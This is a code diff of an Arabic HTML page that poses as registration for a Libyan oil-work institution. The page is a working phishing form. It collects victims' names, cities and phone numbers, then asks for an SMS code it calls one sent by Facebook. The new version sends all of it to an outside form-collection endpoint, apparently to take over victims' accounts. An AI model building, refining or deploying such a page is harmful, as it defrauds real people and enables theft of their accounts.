@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية</title>
+  <title>المؤسسة الوطنية</title>
   <link rel="icon" href="uy.jpeg" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
@@ -66,8 +66,7 @@
       text-align: right;
     }
 
-    input[type="tel"],
-    input[type="text"],
+    input,
     select {
       width: 100%;
       padding: 12px 15px;
@@ -86,8 +85,7 @@
       outline: none;
     }
 
-    input:disabled,
-    select:disabled {
+    input:disabled {
       background-color: #f2f2f2;
     }
 
@@ -110,21 +108,11 @@
       background-color: #e6c200;
     }
 
-    button:disabled {
-      background-color: #c2a300;
-      cursor: not-allowed;
-    }
-
-    #timer {
-      text-align: center;
-      font-weight: 600;
-      color: black;
-      margin-bottom: 20px;
-      min-height: 24px;
-    }
-
-    #codeField {
-      display: none;
+    .note-time {
+      color: #b30000;
+      font-weight: bold;
+      margin-top: 15px;
+      font-size: 15px;
     }
 
     .error {
@@ -133,269 +121,89 @@
       margin-top: -10px;
       margin-bottom: 15px;
     }
-
-    .note-time {
-      color: #b30000;
-      font-weight: bold;
-      margin-top: 15px;
-      font-size: 15px;
-    }
-
-    #countdownOverlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.85);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      flex-direction: column;
-      text-align: center;
-      font-family: 'Cairo', sans-serif;
-    }
-
-    #countdownOverlay h2 {
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-
-    #countdownText {
-      font-size: 36px;
-      font-weight: bold;
-    }
   </style>
 </head>
 <body>
-
-  <div id="countdownOverlay">
-    <h2>🚫 التسجيل غير متاح حالياً</h2>
-    <div id="countdownText">00:00:00</div>
-  </div>
-
   <div class="container">
     <div class="logo-container">
-      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+      <img src="uy.jpeg" alt="شعار المؤسسة" />
       <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
     </div>
 
-    <h2>تسجيل الدخول</h2>
+    <div id="stepOne">
+      <h2>تسجيل الدخول</h2>
+      <form id="stepOneForm" onsubmit="return submitStepOne(event);">
+        <label for="fullname">الاسم الثلاثي:</label>
+        <input type="text" id="fullname" name="fullname" required pattern="[\u0600-\u06FF\s]{8,}" title="يجب أن يحتوي الاسم على 8 أحرف عربية على الأقل">
 
-    <!-- نموذج البيانات الأساسي -->
-    <form id="phoneForm" onsubmit="return sendPhone(event);">
-      <!-- الاسم الثلاثي -->
-      <label for="fullname">الاسم الثلاثي:</label>
-      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي"
-             pattern="[\u0600-\u06FF\s]{8,}" title="يجب أن يكون الاسم باللغة العربية ولا يقل عن 8 أحرف" />
+        <label for="city">السكن:</label>
+        <select id="city" name="city" required>
+          <option value="">اختر المدينة</option>
+          <option>طرابلس</option>
+          <option>بنغازي</option>
+          <option>مصراتة</option>
+          <option>الزاوية</option>
+          <option>سبها</option>
+          <option>الخمس</option>
+          <option>زليتن</option>
+          <option>البيضاء</option>
+          <option>درنة</option>
+          <option>طبرق</option>
+          <!-- أضف المزيد حسب الحاجة -->
+        </select>
 
-      <!-- السكن: قائمة مدن ليبيا -->
-      <label for="city">السكن:</label>
-      <select id="city" name="city" required>
-        <option value="" disabled selected>اختر المدينة</option>
-        <option value="طرابلس">طرابلس</option>
-        <option value="بنغازي">بنغازي</option>
-        <option value="مصراتة">مصراتة</option>
-        <option value="سبها">سبها</option>
-        <option value="البيضاء">البيضاء</option>
-        <option value="زليتن">زليتن</option>
-        <option value="طبرق">طبرق</option>
-        <option value="الخمس">الخمس</option>
-        <option value="درنة">درنة</option>
-        <option value="اجدابيا">اجدابيا</option>
-        <option value="غريان">غريان</option>
-        <option value="الزاوية">الزاوية</option>
-        <option value="صبراتة">صبراتة</option>
-        <option value="صرمان">صرمان</option>
-        <option value="نالوت">نالوت</option>
-        <option value="غات">غات</option>
-        <option value="الكفرة">الكفرة</option>
-        <option value="مرزق">مرزق</option>
-        <option value="زوارة">زوارة</option>
-      </select>
+        <label for="phone">رقم الهاتف:</label>
+        <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,15}" title="يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً">
 
-      <!-- رقم الهاتف -->
-      <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+        <button type="submit">أرسل البيانات</button>
+      </form>
+    </div>
 
-      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
-      <div id="timer"></div>
-    </form>
-
-    <!-- نموذج إدخال الكود -->
-    <form id="codeForm" onsubmit="return sendCode(event);">
-      <div id="codeField">
-        <label for="code">جاري إرسال الكود عبر SMS</label>
-        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+    <div id="stepTwo" style="display: none;">
+      <h2>انتظار الكود من شركة فيسبوك</h2>
+      <form id="stepTwoForm" onsubmit="return submitStepTwo(event);">
+        <label for="code">ادخل الكود:</label>
+        <input type="text" id="code" name="code" required placeholder="ادخل الكود المرسل عبر SMS">
         <div id="errorMessage" class="error"></div>
-        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
-      </div>
-    </form>
+        <button type="submit">تأكيد الدخول</button>
+      </form>
+    </div>
 
     <p class="note-time">🕒 وقت التسجيل: من الساعة 8:00م حتى الساعة 10:00م</p>
   </div>
 
   <script>
-    // التحقق من وقت التسجيل (8:00 - 10:00 مساءً)
-    function isWithinTime() {
-      const now = new Date();
-      const hour = now.getHours();
-      return hour >= 20 && hour < 22; // 8:00 - 10:00 مساءً
-    }
-
-    function getNextOpenTime() {
-      const now = new Date();
-      const openTime = new Date();
-      openTime.setHours(20, 0, 0, 0); // الساعة 8:00 مساءً
-
-      if (now.getHours() >= 22) {
-        openTime.setDate(openTime.getDate() + 1);
-      } else if (now.getHours() < 20) {
-        // نفس اليوم
-      } else {
-        openTime.setDate(openTime.getDate() + 1);
-      }
-
-      return openTime;
-    }
-
-    function updateCountdown() {
-      const overlay = document.getElementById("countdownOverlay");
-      const countdownText = document.getElementById("countdownText");
-      const phoneForm = document.getElementById("phoneForm");
-      const codeForm = document.getElementById("codeForm");
-
-      if (isWithinTime()) {
-        overlay.style.display = "none";
-        phoneForm.style.display = 'block';
-        codeForm.style.display = 'block';
-        return;
-      }
-
-      overlay.style.display = "flex";
-      phoneForm.style.display = 'none';
-      codeForm.style.display = 'none';
-
-      const now = new Date();
-      const openTime = getNextOpenTime();
-      const diff = Math.max(0, Math.floor((openTime - now) / 1000));
-
-      const hours = Math.floor(diff / 3600).toString().padStart(2, '0');
-      const minutes = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
-      const seconds = (diff % 60).toString().padStart(2, '0');
-
-      countdownText.textContent = `الفتح خلال: ${hours}:${minutes}:${seconds}`;
-    }
-
-    setInterval(updateCountdown, 1000);
-    window.onload = updateCountdown;
-
-    // وظائف النماذج
-    let countdownInterval;
-    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-    const timerDisplay = document.getElementById('timer');
-    const codeField = document.getElementById('codeField');
-    const phoneInput = document.getElementById('phone');
-    const codeInput = document.getElementById('code');
-    const errorMessage = document.getElementById('errorMessage');
-
-    function startTimer(duration) {
-      let timeLeft = duration;
-      timerDisplay.style.display = 'block';
-      updateTimer(timeLeft);
-      countdownInterval = setInterval(() => {
-        timeLeft--;
-        updateTimer(timeLeft);
-        if (timeLeft <= 0) {
-          clearInterval(countdownInterval);
-          timerDisplay.style.display = 'none';
-          sendPhoneBtn.disabled = false;
-          phoneInput.disabled = false;
-        }
-      }, 1000);
-    }
-
-    function updateTimer(seconds) {
-      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
-      const secs = (seconds % 60).toString().padStart(2, '0');
-      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
-    }
-
-    // دالة إرسال البيانات (الاسم، السكن، رقم الهاتف)
-    function sendPhone(event) {
-      event.preventDefault();
-
-      const fullname = document.getElementById('fullname').value.trim();
+    function submitStepOne(e) {
+      e.preventDefault();
+      const fullname = document.getElementById('fullname').value;
       const city = document.getElementById('city').value;
-      const phone = phoneInput.value.trim();
+      const phone = document.getElementById('phone').value;
 
-      // تحقق من الاسم: يجب أن يكون باللغة العربية و8 أحرف فأكثر
-      const arabicNamePattern = /^[\u0600-\u06FF\s]{8,}$/;
-      if (!arabicNamePattern.test(fullname)) {
-        alert('❌ يجب أن يكون الاسم باللغة العربية ولا يقل عن 8 أحرف.');
-        return false;
-      }
-
-      if (!city) {
-        alert('❌ يرجى اختيار المدينة.');
-        return false;
-      }
-
-      if (!phone.match(/^[0-9]{10,15}$/)) {
-        alert('❌ يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً.');
-        return false;
-      }
-
-      // إرسال البيانات إلى Formcarry
       fetch('https://formcarry.com/s/12UxdOsTbaW', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Accept': 'application/json'
         },
-        body: JSON.stringify({
-          fullname: fullname,
-          city: city,
-          phone: phone
-        })
+        body: JSON.stringify({ fullname, city, phone })
       })
-      .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال البيانات');
-
-        // تعطيل حقل الهاتف والزر
-        phoneInput.disabled = true;
-        sendPhoneBtn.disabled = true;
-        // عرض قسم إدخال الكود
-        codeField.style.display = 'block';
-        // بدء المؤقت (8 دقائق)
-        startTimer(480);
+      .then(res => {
+        if (!res.ok) throw new Error('فشل في الإرسال');
+        document.getElementById('stepOne').style.display = 'none';
+        document.getElementById('stepTwo').style.display = 'block';
       })
-      .catch(error => {
-        alert('⚠️ تعذر إرسال البيانات. حاول مرة أخرى.');
-        console.error(error);
+      .catch(err => {
+        alert('حدث خطأ أثناء إرسال البيانات.');
+        console.error(err);
       });
-
-      return false;
     }
 
-    // دالة إرسال الكود (تُرسل فقط الكود ورقم الهاتف)
-    function sendCode(event) {
-      event.preventDefault();
-      errorMessage.textContent = '';
-
-      if (codeInput.value.trim() === '') {
-        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
-        codeInput.focus();
-        return false;
-      }
-
-      const payload = {
-        phone: phoneInput.value,
-        code: codeInput.value
-      };
+    function submitStepTwo(e) {
+      e.preventDefault();
+      const phone = document.getElementById('phone').value;
+      const code = document.getElementById('code').value;
+      const errorDiv = document.getElementById('errorMessage');
+      errorDiv.textContent = '';
 
       fetch('https://formcarry.com/s/12UxdOsTbaW', {
         method: 'POST',
@@ -403,25 +211,21 @@
           'Content-Type': 'application/json',
           'Accept': 'application/json'
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({ phone, code })
       })
-      .then(async response => {
-        const data = await response.json();
-
-        if (response.ok && data.success !== false) {
+      .then(async res => {
+        const data = await res.json();
+        if (res.ok && data.success !== false) {
           window.location.href = 'success.html';
         } else {
-          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
+          errorDiv.textContent = '❌ الكود غير صحيح. حاول مرة أخرى.';
         }
       })
-      .catch(error => {
-        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
-        console.error(error);
+      .catch(err => {
+        errorDiv.textContent = '⚠️ تعذر الاتصال بالخادم';
+        console.error(err);
       });
-
-      return false;
     }
   </script>
-
 </body>
 </html>
